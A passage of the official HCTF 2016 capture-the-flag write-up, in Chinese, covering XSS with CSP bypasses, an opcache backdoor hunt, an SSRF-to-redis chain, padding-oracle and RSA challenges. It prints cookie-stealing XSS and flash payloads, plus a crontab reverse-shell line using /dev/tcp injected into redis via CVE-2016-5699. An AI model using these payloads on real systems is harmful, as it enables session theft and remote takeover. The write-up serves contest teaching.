<pre><code>&lt;script&gt;var xml = new XMLHttpRequest(); xml.open('POST', '<a href="http://sguestbook.hctf.io/submit.php">http://sguestbook.hctf.io/submit.php</a>', true); xml.setRequestHeader("Content-type","application/x-www-form-urlencoded"); xml.send('to=xxxx&amp;message='+document.cookie);    &lt;/script&gt;</code></pre>
</p>
<p>然后向admin发送</p>
<pre><code>&lt;scscriptript src="<a href="http://115.28.78.16:12222/static/redirect.php?u=/upload/cf4b03010ddaafec5933f656fad2692d">http://115.28.78.16:12222/static/redirect.php?u=/upload/cf4b03010ddaafec5933f656fad2692d</a>"&gt;&lt;/scriscriptpt&gt;</code></pre>
<p><b>### 前面步骤相同，最后的域限制通过跳转来绕过 ###</b></p>
<p>这个其实没什么好说的，其他的部分相同，只有最后一步使用location来获得cookie，payload和上题相同，就不贴了。</p>
<p><b>### 精心构造flash xss ###</b></p>
<p>这种方式是Blue-Whale的师傅想到的，根据上面CSP限制，我们很快就能发现其实对于除script以外的部分都比较友好，只要在域内就可以了，再加上，域内存在上传点，那么我们是不是可以构造一个**Action Script**</p>
<p>payload，头像处上传</p>
<pre><code><p>import flash.external.ExternalInterface;</p><p>var ck; ck = ExternalInterface.call('function(){return document.cookie}'); ua = ExternalInterface.call('function(){return navigator.userAgent}'); ExternalInterface.call("$.post","submit.php",'to=qqc&amp;message=document.cookie'+ck+ua); stop();</p></code></pre>
</p>
<p>然后构造</p>
<pre><code>&lt;embed src="<a href="http://sguestbook.hctf.io/upload/4b3097d0fef014bc099fe305fd2cb685">http://sguestbook.hctf.io/upload/4b3097d0fef014bc099fe305fd2cb685</a>" type="applicatioONn/x-shockwave-flash"&gt;&lt;/embed&gt;</code></pre>
<p>这个payload只要浏览器有flash就可以了</p>
<p><b>### 强制刷新多次跳转 ###</b></p>
<p>这里有一种在比赛中遇到的特别的payload，使用的漏洞和前面提到的相同，也是多次跳转导致的目录绕过，但是特别的是，使用了一种特别的手段</p>
<p>payload我没找到，但是类似于</p>
<pre><code>&lt;META HTTP-EQUIV="refresh" CONTENT="0; url=data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cDovLzE2My40NC4xNTUuMTc5Ijs8L3NjcmlwdD4="&gt;</code></pre>
<p>上面应该是个错误的payload，但是在守护的过程中的确存在有效payload，只可惜没能记录下来。</p>
<p>我最早看到这个payload，在</p>
<p><a href="http://www.tuicool.com/m/articles/77bABnm">http://www.tuicool.com/m/articles/77bABnm</a></p>
<h3><b><br /></b></h3>
<h3><b><br /></b></h3>
<h3><b>## web选手的自我修养 ##</b></h3>
<blockquote><p>题目描述：新搭的wp居然爆了漏洞，真气，漏洞修复了却被安了后门，你能找到后门在哪吗？？？提供压缩包为docker镜像</p></blockquote>
<p>这题目其实可以出的特别好，但是由于我个人要管的题目太多了，所以搞着搞着就乱了，导致这道题目被非预期所沦陷了，这里我就重新说一遍正解吧。</p>
<p>首先在正常的题目中，现在在home目录下的脚本是不该存在的，也不会存在所谓的viminfo以及access.log日志。</p>
<p>加载docker之后，首先发现docker中只存在lnmp环境，其余没有任何服务，我们找到`/home/wwwroot/default/`下是web目录，里面放了一个最新版的wp，并且还能找到压缩包</p>
<p>既然题目中是站中安了后门，首先肯定是解压源码，然后diff文件，很快就能发现，源码其实并没有被改变。</p>
<p>那么写一个phpinfo.php页面</p>
<p style="text-align: center;"><img alt="11.png" data-original="http://image.3001.net/images/20161202/14806145541542.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="340">     </p>
<noscript><img alt="11.png" src="http://image.3001.net/images/20161202/14806145541542.png!small" width="690" height="340">     </p></noscript>
<p>我们发现php版本是7.0.7，接着向下看</p>
<p style="text-align: center;"><img alt="12.png" data-original="http://image.3001.net/images/20161202/14806145995360.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="353">     </p>
<noscript><img alt="12.png" src="http://image.3001.net/images/20161202/14806145995360.png!small" width="690" height="353">     </p></noscript>
<p>我们发现不一样的东西。php opcache开启，而且检验一致性的配置已经关闭了（7.0.7增加了这个配置，为了漏洞存在，我关闭了这个）</p>
<p>那么猜测后门被直接写入了bin中，那么大家肯定会想到这个工具。</p>
<p><a href="http://lorexxar.cn/2016/05/27/opcache-jcfx/">http://lorexxar.cn/2016/05/27/opcache-jcfx/</a></p>
<p>也就是我在测试中无意留在镜像中的脚本，但是很多队伍都发现了，这个脚本是存在问题的。</p>
<p>因为在镜像中有个库版本过高，所以整个脚本完全跑不起来，所以我想了另一种分析方式。</p>
<p><b>第一种，时间戳排序法</b></p>
<p>回想漏洞存在的条件，如果真的到了通过这种方式拿后门的情况，写后门一定会写入不容易被改变的位置，因为如果文件被改变，bin就会重新编译。</p>
<p><b>其次，既然我需要写入后门进bin中，肯定需要修改bin，那么文件的时间戳一定会被改变。</b></p>
<p>那么在一群没怎么被改变的文件处，最新的部分时间戳中一定有问题。</p>
<p>那么锁定文件，flag一定是可显字符串，可以没必要分析字节码，直接strings即可</p>
<h3></h3>
<h3></h3>
<h3>## AT Field ##</h3>
<p>### 题目描述 ###</p>
<blockquote><p>Welcome to ATField.</p>
<p>hint：</p>
<p>1: 在第一题里不只有flag，还有第二题的入口</p>
<p>2、扫端口没用，几百线程也没用的呀</p>
<p>3、我从来没说过，flag1那里没有别的东西啊</p>
<p>4、安nosql的服务器是centos</p>
<p>5、mdzz，没人注意到nosql的语法吗</p>
</blockquote>
<p><b>### 解题逻辑 ###</b></p>
<p>AT Field1首先是很简单的ssrf绕过，绕过ssrf之后，大部分人都选择了扫127.0.0.1的端口，想找到本地开启的服务。</p>
<p>为了大家能在有限的时间里不浪费时间，我放出了前3条hint，之所以不想说的太明白，是因为出题的时候，认为这一步是需要扫目录的，在flag1的位置index.php那里，是通过git clone到本地的，虽然我删除了.git，但是却</p>
<p>遗留了README.md，在Readme中，我们获得了很多关于下一步的信息。</p>
<blockquote><p>11.23</p>
<p>ak说上线的.git要都删了，以免被拖源码</p>
<p>11.24</p>
<p>听ak说nosql蛮好用的，link一个玩玩看</p>
<p>11.25</p>
<p>哎呀,docker怎么没有crontab,都不能定时重启，装一个装一个</p>
</blockquote>
<p><b>事实上，在这三句话中能获得信息远远超过你的想象&#8230;</b></p>
<p>首先是nosql，我们可以得到服务的大致端口号，这个我相信大部分人都能想想到</p>
<p>其次就是docker，如果你尝试过使用docker来连接容器的话，你就会知道很多隐藏信息</p>
<blockquote><p>1、redis的docker中没有任何多余的服务，crontab也没有，当然也不可能有web服务</p>
<p>2、docker的连接方式类似于内网，所以和题目并不在同一个docker</p>
<p>3、docker内网比较特殊，类似于从192.168.0.1开始，如果前面的ip被占用，就依次递增，由于题目环境并不复杂，所以内网的ip并不是太多，理论上来说，不超过30个请求就能找到目标ip（这里有一个方式是用过host来代替ip，遗憾的是，经过我的测试，host替代会导致python urllib header注入失败）</p>
<p>4、docker的默认用户是root</p>
</blockquote>
<p>或许你可能没有得到那么多信息，那么稍后我们顺着题目思路，来看看这些条件是如何利用的</p>
<p>紧接着很快就能发现整个站是python的，而且请求图片是通过urllib方式，那么很自然的想到了python urllib httpheader注入。</p>
<p>国内主要是这两篇文章</p>
<p><a href="http://www.tuicool.com/articles/2iIj2eR">http://www.tuicool.com/articles/2iIj2eR</a></p>
<p><a href="https://security.tencent.com/index.php/blog/msg/106">https://security.tencent.com/index.php/blog/msg/106</a></p>
<p>由于redis写入的文件有莫名的头和尾，所以这里只有centos才能成功通过crontab来弹shell</p>
<pre><code><p>这里先总结整个流程：</p><p>302-&gt;本机ssrf-&gt;内网-&gt;内网的redis-&gt;python urllib http头注入构造redis请求--&gt;redis写入crontab-&gt;crontab定时执行getshell</p></code></pre>
<p>整个题目最难的其实就是黑盒，因为全程你并不知道是不是写入成功了，所以想要提高成功率，必须在本地redis搭建成功</p>
<p><b>### writeup ###</b></p>
<p><b>#### AT Field1 ####</b></p>
<p>整个题目打开是这样的</p>
<p style="text-align: center;"><img alt="1.png" data-original="http://image.3001.net/images/20161202/14806148462983.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="466">     </p>
<noscript><img alt="1.png" src="http://image.3001.net/images/20161202/14806148462983.png!small" width="690" height="466">     </p></noscript>
<p>随便放个图片地址，发现返回了一张图片，</p>
<p style="text-align: center;"><img alt="2.png" data-original="http://image.3001.net/images/20161202/14806148685813.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="630" height="400">     </p>
<noscript><img alt="2.png" src="http://image.3001.net/images/20161202/14806148685813.png!small" width="630" height="400">     </p></noscript>
<p>从这部分 很容易想到这里存在ssrf，那么问题就是如何过滤了。</p>
<p>稍微测试下，我们发现返回了</p>
<pre><code><p>**NoNoNo, guys, Links must be accord with standard of .tld and contain domain name.**</p></code></pre>
<p>这里我们测试能发现，并不允许ip的请求，也就是描述中所说的，请求必须符合.tld标准并且包含域名，如果想要请求127.0.0.1，我们这里有两种绕过方式</p>
<pre><code><p>1、<a href="http://www.127.0.0.1.xip.io/">http://www.127.0.0.1.xip.io</a></p><p>这种方式可以自动把域名指向中间的ip，在一些特殊情况下非常好用</p><p>2、<a href="http://xxxxx/?u=http://127.0.0.1">http://xxxxx/?u=http://127.0.0.1</a></p><p>在有域名的vps上写一个跳转页面实现，事实上，只有第二种做法可以顺利继续做下一题</p></code></pre>
</p>
<p><b>#### AT Field2 ####</b></p>
<p>到了这里，很容易误解认为要扫本机的服务，所以及时放出了3个提示</p>
<blockquote><p>1: 在第一题里不只有flag，还有第二题的入口</p>
<p>2、扫端口没用，几百线程也没用的呀</p>
<p>3、我从来没说过，flag1那里没有别的东西啊</p>
</blockquote>
<p>不能说提示有多明显吧，但是我相信从hint不难得出，在上一个flag所在页面，存在一些别的未知的文件，那么抄起扫目录的脚本，跑一跑，很快找到`<a href="http://127.0.0.1/README.md">http://127.0.0.1/README.md</a>`</p>
<p>base64解码得到</p>
<blockquote><p>11.23</p>
<p>ak说上线的.git要都删了，以免被拖源码</p>
<p>11.24</p>
<p>听ak说nosql蛮好用的，link一个玩玩看</p>
<p>11.25</p>
<p>哎呀,docker怎么没有crontab,都不能定时重启，装一个装一个</p>
</blockquote>
<p><b>事实上，在这三句话中能获得信息远远超过你的想象&#8230;</b></p>
<p>首先是nosql，我们可以得到服务的大致端口号，这个我相信大部分人都能想想到</p>
<p>其次就是docker，如果你尝试过使用docker来连接容器的话，你就会知道很多隐藏信息</p>
<blockquote><p>1、redis的docker中没有任何多余的服务，crontab也没有，当然也不可能有web服务</p>
<p>2、docker的连接方式类似于内网，所以和题目并不在同一个docker</p>
<p>3、docker内网比较特殊，类似于从192.168.0.1开始，如果前面的ip被占用，就依次递增，由于题目环境并不复杂，所以内网的ip并不是太多，理论上来说，不超过30个请求就能找到目标ip（这里有一个方式是用过host来代替ip，遗憾的是，经过我的测试，host替代会导致python urllib header注入失败）</p>
<p>4、docker的默认用户是root</p>
</blockquote>
<p>首先我们根据拿到的提示扫内网，目标大概是192.168.0.1向上，端口为熟悉的nosql端口。<b>注意这里有可能存在误区，因为通过link连入的docker内**不存在任何多余的服务**，所以22、80、8080端口都不可能开放！</b></p>
<p>其次就是，如果向redis服务端口发送数据，如果符合格式则会写入数据，如果不符合格式也不会有任何返回，如果向存在服务的端口发送数据的话，页面会因为**超时返回500**，但如果不存在，则会直接返回**urlopen error**</p>
<p><b>根据上面的信息爆破，很快就能得到redis位置**192.168.0.10/6379**</b></p>
<p>根据请求头，不难发现请求中ua为python的urllib</p>
<p>这里先推荐几篇文章</p>
<p><a href="https://security.tencent.com/index.php/blog/msg/106">https://security.tencent.com/index.php/blog/msg/106</a></p>
<p><a href="http://www.tuicool.com/articles/2iIj2eR">http://www.tuicool.com/articles/2iIj2eR</a></p>
<p><b>这里的python urllib header注入漏洞编号**CVE-2016-5699**，值得注意的是由于python的更新频率比较快，所以基本上已经很少有版本存在这个漏洞了，要求**python3 &lt; 3.4.3 || python2 &lt; 2.7.9**</b></p>
<p>而且，windows上会无效，提示geturlinfo error，至今不能肯定原因。</p>
<p>漏洞成因就不多赘述了，这里构造redis向crontab配置文件，写入</p>
<pre><code>\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/这里是ip/端口 0&gt;&amp;1\n</code></pre>
<p>事实上，漏洞成因和底层系统同样有关，这里必须是centos才能成功写入crontab并执行，这里我们追踪一份payload来看看实现。</p>
<p><b>payload</b>:</p>
<p>    <a href="http://www.115.28.78.16.xip.io/302.php?u=http%3A%2f%2f192.168.0.10%250d%250a%2a3%250d%250a%25243%250d%250aset%250d%250a%25241%250d%250a1%250d%250a%252462%250d%250a%250a%2a%252F1%2520%2a%2520%2a%2520%2a%2520%2a%2520%252Fbin%252Fbash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252F"></a></p>
<pre><code><a href="http://www.115.28.78.16.xip.io/302.php?u=http%3A%2f%2f192.168.0.10%250d%250a%2a3%250d%250a%25243%250d%250aset%250d%250a%25241%250d%250a1%250d%250a%252462%250d%250a%250a%2a%252F1%2520%2a%2520%2a%2520%2a%2520%2a%2520%252Fbin%252Fbash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252F">http://www.115.28.78.16.xip.io/302.php?u=http%3A%2f%2f192.168.0.10%250d%250a%2a3%250d%250a%25243%250d%250aset%250d%250a%25241%250d%250a1%250d%250a%252462%250d%250a%250a%2a%252F1%2520%2a%2520%2a%2520%2a%2520%2a%2520%252Fbin%252Fbash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252F</a>你的ip%252f12345%25200%253E%25261%250a%250d%250aconfig%2520set%2520dir%2520%252Fvar%252Fspool%252Fcron%252F%250d%250aconfig%2520set%2520dbfilename%2520root%250d%250asave%250d%250a%3A6379%2f</code></pre>
</p>
<p>请求经过跳转，经过一次urldecode，</p>
<p>    <a href="http://192.168.0.10%0D%0A/"></a></p>
<pre><code><a href="http://192.168.0.10%0D%0A/" class="">http://192.168.0.10%0d%0a</a>*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2462%0d%0a%0a*%2F1%20*%20*%20*%20*%20%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F你的ip%2f12344%200%3E%261%0a%0d%0aconfig%20set%20dir%20%2Fvar%2Fspool%2Fcron%2F%0d%0aconfig%20set%20dbfilename%20root%0d%0asave%0d%0a:6379/</code></pre>
<p>然后urldecode进入redis</p>
<p style="text-align: center;"><img alt="Image" data-original="http://image.3001.net/images/20161202/14806155072736.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="659" height="340">     </p>
<noscript><img alt="Image" src="http://image.3001.net/images/20161202/14806155072736.png!small" width="659" height="340">     </p></noscript>
<p>注意这里在redis中，只有0d0a可以被当作换行符</p>
<p>我发现我们将数据设置为1，并储存进入**/var/spool/cron/root**，写入内容为</p>
<p style="text-align: center;"><img alt="4.png" data-original="http://image.3001.net/images/20161202/14806155202545.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="625" height="38">     </p>
<noscript><img alt="4.png" src="http://image.3001.net/images/20161202/14806155202545.png!small" width="625" height="38">     </p></noscript>
<p>写入文件的内容是这样的，前后被插入了特殊的数据</p>
<p style="text-align: center;"><img alt="5.png" data-original="http://image.3001.net/images/20161202/14806155401662.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="635" height="64">     </p>
<noscript><img alt="5.png" src="http://image.3001.net/images/20161202/14806155401662.png!small" width="635" height="64">     </p></noscript>
<p>事实上，在除centos以外系统上，redis是redis用户跑起来的，所以写的文件也是redis用户组，并没有权限写入cron文件夹，并且，在其他系统中，这个配置文件有较为严格的格式要求，如果存在奇怪的数据，会导致命令执行失败。</p>
<p>还有一个特别的问题，redis中储存数据为键值对形式，所以其实把内容写入2，就不会覆盖了，我们来看看测试</p>
<p style="text-align: center;"><img alt="6.png" data-original="http://image.3001.net/images/20161202/14806156381094.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="669" height="81">     </p>
<noscript><img alt="6.png" src="http://image.3001.net/images/20161202/14806156381094.png!small" width="669" height="81">     </p></noscript>
<p style="text-align: center;"><img alt="7.png" data-original="http://image.3001.net/images/20161202/14806156531591.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="586" height="107">     </p>
<noscript><img alt="7.png" src="http://image.3001.net/images/20161202/14806156531591.png!small" width="586" height="107">     </p></noscript>
<p>成功了，事实上，hint5也就是因此存在的，我们成功拿到了反弹的shell</p>
<h2><b><br /></b></h2>
<h2><b><br /></b></h2>
<h2><b><br /></b></h2>
<h2><b># Level 4 #</b></h2>
</p>
<h3></h3>
<h3></h3>
<h3>## 5-days ##</h3>
</p>
<p>[wp地址](<a href="https://github.com/spineee/hctf2016_5-days/blob/master/5-days%20wp.pdf">https://github.com/spineee/hctf2016_5-days/blob/master/5-days%20wp.pdf</a>)</p>
<h3></h3>
<h3></h3>
<h3>## 二进制选手的自我修养 ##</h3>
<p>作为一位二进制选手，re，pwn，crypto都是自己的必修课23333</p>
<p>这一题的出现也是偶然。某一天在写一个根据密钥自解密代码运行的程序。而如果输入的密钥是错误的，程序就会直接退出。那个时候突然想到，如果我输入的某一个密钥。解密出来的代码正好是一段恶意的代码会怎么样？顺着这个思路就有了这一题</p>
<p>密码学部分其实也是正好听做web的队友讲起过的padding oracle攻击方式。在仔细的研究了这种攻击方式之后，发现这种攻击正好适合我设想的情况。</p>
<blockquote><p>1.在不知道密钥的情况，通过密码学攻击还原出明文的内容，然后进行逆向，获得一半的flag</p>
<p>2.在不知道密钥的情况下，通过padding oracle来控制解密出来的内容是shellcode，从而获得系统权限。</p>
</blockquote>
<p>PS：我还算很好心的，本来des打算用静态编译来着。而且因为自己失误，结果连符号都没有去掉</p>
<p>PS2：关于奇怪的main2.c。其实做题的时候，服务器端的代码是main2.c，而给选手的代码main.c。main2产生的理由有2个，一个是服务器上由于沙箱和一些环境原因，所以key文件和程序工作目录不是同一个，需要制定觉得路径。然而并不想因为绝对路径暴露服务器信息和对选手调试产生麻烦。</p>
<p>而服务器程序中的循环是因为根据本来的逻辑，如果填充校验不过应该直接退出。然而开启新线程开销很大，所以使用这种方法来减少开销，结合沙箱的自动重启机制。我相信没有什么选手在比赛中发现服务器上程序和自己拿到的不是同一个</p>
<h3></h3>
<h3></h3>
<h3>## Crypto So Amazing ##</h3>
<blockquote><p>题目: &lt;<a href="https://github.com/Hcamael/ctf-library/tree/master/RSA3">https://github.com/Hcamael/ctf-library/tree/master/RSA3</a>&gt;</p>
<p>payload:</p>
<p>- &lt;<a href="https://github.com/Hcamael/ctf-library/blob/master/RSA3/rsa3_payload.py">https://github.com/Hcamael/ctf-library/blob/master/RSA3/rsa3_payload.py</a>&gt;</p>
<p>- &lt;<a href="https://github.com/Hcamael/ctf-library/blob/master/RSA3/rsa3.sage">https://github.com/Hcamael/ctf-library/blob/master/RSA3/rsa3.sage</a>&gt;</p>
</blockquote>
<p>出题时预测的分数在450分左右, 不过却没有能做出来, 我知道的几个队都是被上一题的脚本给坑了</p>
<p><b>本题思路来源: 基于有限域F(2^m)上椭圆曲线的RSA后门生成算法</b></p>
<p>流程图懒得画了, 上一题的后门算法看懂了, 这题去看代码也不难, 主要是通过`Diffie–Hellman key exchange`算法生成私钥作为种子生成伪随机数, 私钥很好求, 本题的难点跟上题一样同样在于`Coppersmith partial information attack`算法</p>
<p>上一题我故意改简单了, 已知p的前640比特, 所以可以很容易通过&lt;<a href="https://github.com/Gao-Chuan/RSA-and-LLL-attacks">https://github.com/Gao-Chuan/RSA-and-LLL-attacks</a>&gt;这个脚本恢复出完整的p</p>
<p>但是这题已知p的前576bit, github上的那个脚本就跑不出来了</p>
<p>这部分是出题时无意间挖出的坑, 因为我并不知道github上的这个脚本, 在我预想中能做出rsa2的基本都是能做出rsa3的</p>
<p>这题还有一个坑点</p>
<p style="text-align: center;"><img alt="hctf_rsa_keng2.png" data-original="http://image.3001.net/images/20161202/14806162135691.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="321">     </p>
<noscript><img alt="hctf_rsa_keng2.png" src="http://image.3001.net/images/20161202/14806162135691.png!small" width="690" height="321">     </p></noscript>
<p style="text-align: center;"><img alt="hctf_rsa_keng1.png" data-original="http://image.3001.net/images/20161202/14806150948035.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="257">     </p>
<noscript><img alt="hctf_rsa_keng1.png" src="http://image.3001.net/images/20161202/14806150948035.png!small" width="690" height="257">     </p></noscript>
<p>sage和python 用相同的seed生成的随机数不一样, 所以在payload中我使用了python生成随机数</p>
<p>比赛结束，很多小伙伴一直急着问我们官方writeup什么时候出，最近特别忙一直拖到现在才发，在此说一声抱歉。也感谢小伙伴们对我们Vidar-Team及HCTF的关注与支持，当我看到群里小伙伴们能这么说，感觉还是很欣慰的。</p>
<h2 style="text-align: center;"><img alt="liang.png" data-original="http://image.3001.net/images/20161202/14806168984884.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="643"></h2>
<noscript><img alt="liang.png" src="http://image.3001.net/images/20161202/14806168984884.png!small" width="690" height="643"></h2></noscript>
<p>相信接下来，在大家的关心和支持下，在我们的不断努力下，Vidar-Team会越走越远，HCTF也会越来越精彩，最后再说声感谢～。</p>
<p>PS ： 这次比赛单单Web题就收到470w+的请求，很多小伙伴比赛过程中开着扫描器乱扫，我一不留神就有一个队伍就扫了30w次，（没错，乱扫的IP都是被我ban的&#8230;比赛最后10个小时内我还Ban了一个C段的IP&#8230;..说完这句我就逃&#8230;），其实大部分题目都不用扫的，个别需要的我们也会注明的。乱扫也出不来flag反而会被ban，于彼与此都没好处&#8230;&#8230;(^○^)</p>
<p>如有任何问题，欢迎联系我们。Email ：public#vidar.club ( # 替换 @ )</p>
<p><b><span style="font-size: 15px;">*本文原创作者：sysorem，本文属FreeBuf原创奖励计划，未经许可禁止转载</span>    </b>    </p>
                                                    </div>
                        <div class="article-oper article-oper-new">
                            <style>
                                @font-face {font-family: 'iconfont';
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot'); /* IE9*/
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
                                    url('http://static.3001.net/iconfonts/iconfont.woff') format('woff'), /* chrome、firefox */
                                    url('http://static.3001.net/iconfonts/iconfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
                                    url('http://static.3001.net/iconfonts/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
                                }
                            </style>
                            <div class="share-new clearfix">
                                <div class="share-author">
                                                                            <a href="http://www.freebuf.com/author/sysorem" title="由 sysorem 发布" rel="author">
                                            <img src="http://image.3001.net/2015/11/admin-avatar.png" width="50" height="50" alt="sysorem" class="avatar avatar-50 wp-user-avatar wp-user-avatar-50 photo" />                                            <!--							<img src="http://image.3001.net/2015/06/17.jpg" alt="ArthurKiller">-->
                                        </a>
                                        <div class="share-author-info">
                                                                                        <a class="author-name" href="http://www.freebuf.com/author/sysorem">sysorem</a>
                                            <!--<span class="icon-f"></span>-->
                                            <span>
                                <i class="colour-red">
                                    5                                </i>
                                篇文章</span>
                                            <span>等级：
                                <i class="colour-green">3</i>级
                            </span>
                                        </div>
                                                                                                        </div>
                                <div class="user-center clearfix">
                                                                            <a href="http://www.freebuf.com/author/sysorem" data-toggle="tooltip" data-placement="top" title="个人主页" class="home" target="_blank"></a>
                                                                        <a href="http://www.freebuf.com/user/pm?pmaction=newmessage&to=sysorem" data-toggle="tooltip" data-placement="top" title="私信" class="letter" target="_blank"></a>
                                </div>
                                <div class="share-ctrl clearfix">
                                                                        <div class="bdsharebuttonbox clearfix bdshare-button-style1-24 columnstatus"
                                         data-bd-bind="1489991449190" data-column="" data-title="HCTF 2016网络攻防大赛官方Writeup" data-name="">
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="tsina" title="分享到新浪微博" id="tsina"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="weixin" title="分享到微信" id="weixin"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="qzone" title="分享到QQ空间" id="qzone"></a>
                                       <!-- _shareUrlWeibo = 'http://service.weibo.com/share/share.php?url=http://'+encodeURIComponent(_json[i].url)+'&title='+encodeURIComponent(_json[i].title)+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareUrlZone = 'http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://'+encodeURIComponent(_json[i].url)+'&title='+_json[i].title+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareSrc = 'http://s.jiathis.com/qrcode.php?url=http://'+_json[i].url;-->
                                        <span class="share-line">|</span>
                                    </div>
                                </div>
                                <div class="user-ctrl clearfix">
                                                                            <a href="http://www.freebuf.com/oauth" id="collect" data-toggle="tooltip" data-placement="top" title="收藏" ></a>
                                                                        <a href="#respond" data-toggle="tooltip" data-placement="top" title="评论" id="comments"></a>
                                                                        <!--					<a href="#" title="文章纠正">&#xe6e3;</a>-->
                                    <span class="share-line">|</span>
                                    <span class="info-alert"></span>
                                </div>
                            </div>
                            <script>
                                var column = $('.columnstatus').attr('data-column');
                                var text = '';
                                if(column){
                                    var title = $('.columnstatus').attr('data-title');
                                    var name = $('.columnstatus').attr('data-name');
                                    text = title+' - FreeBuf专栏·'+name;
                                }
                                window._bd_share_config={
                                    "common": {
                                        "bdSnsKey": {},
                                        "bdText": text,
                                        "bdMini": "2",
                                        "bdMiniList": ["qzone", "tsina", "weixin"],
                                        "bdPic": "",
                                        "bdStyle": "1",
                                        "bdSize": "24"
                                    },
                                    "share":{},
                                };
                                with(document)0[
                                    (getElementsByTagName('head')[0]||body).
                                    appendChild(createElement('script')).
                                        src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)
                                    ];
                                //控制垂直方向分享模块的定位
                                function shareFixVertical(){
                                    var offsetTop = jQuery(".article-oper").get(0).offsetTop;
                                    var win_h = jQuery(window).height();
                                    var win_w = jQuery(window).width();
                                    var scrollTop = document.body.scrollTop||document.documentElement.scrollTop;
                                    var _height = offsetTop-scrollTop;
                                    var _flag = $('.column-article').attr('data-column');
                                    if(_flag == 1) {
                                        if(_height>=win_h-660&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }else {
                                        if(_height>=win_h-255&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }
                                }
                                //控制水平方向分享模块的定位
                                function shareFixHorizontal(){
                                    var _width = jQuery("#getWidth").innerWidth()-30;
                                    var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                    var win_w = document.documentElement.clientWidth || document.body.clientWidth;
                                    jQuery(".fixed").css({
                                        width:_width,
                                        left:_left
                                    });
                                    if(win_w< 975){
                                        jQuery(".share-new").css({
                                            width: "100%",
                                            left: "0"
                                        });
                                    }else{
                                        var _width = jQuery("#getWidth").innerWidth()-30;
                                        var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                        jQuery(".fixed").css({
                                            width:_width,
                                            left:_left
                                        });
                                    }
                                }
                                function click(){
                                    var _w = jQuery(window).width();
                                    jQuery(document).click(function(e){
                                        if(jQuery(e.target).attr("id")=="weixin"){
                                            if(_w <= 760) {
                                                jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                                layer.open({
                                                    title: '提示',
                                                    btnAlign: 'c',
                                                    content: '请使用手机浏览器自带的分享功能分享该页面',
                                                    area: '260px'
                                                });
                                            }else {
                                                jQuery("#bdshare_weixin_qrcode_dialog").show();
                                            }
                                        }else {
                                            jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                        }
                                    });
                                }

                                jQuery(window).on("load",function(){
                                    shareFixVertical();
                                    click();
                                });

                                jQuery(window).on("scroll",function(){
                                    //判断滚轮方向
                                    var agent = navigator.userAgent;
                                    if (/.*Firefox.*/.test(agent)) {
                                        document.addEventListener("DOMMouseScroll", function(e) {
                                            e = e || window.event;
                                            var detail = e.detail;
                                            if (detail > 0) {
                                                $(".share-new").removeClass("fixed");
                                                $(".share-new").css({
                                                    width: "100%"
                                                });
                                                $('.main-header .header').removeClass('op1');
                                                $('.main-header .header').addClass('op0');
                                            } else {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            }
                                        });
                                    } else {
                                        document.onmousewheel = function(e) {
                                            e = e || window.event;
                                            var wheelDelta = e.wheelDelta;
                                            if (wheelDelta > 0) {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            } else {
                                                $(".share-new").removeClass("fixed");
                                                $(".share-new").css({
                                                    width: "100%"
                                                });
                                                $('.main-header .header').removeClass('op1');
                                                $('.main-header .header').addClass('op0');
                                            }
                                        }
                                    }
                                });


                                jQuery(window).on("resize",function(){
                                    shareFixHorizontal();
                                    click();
                                })

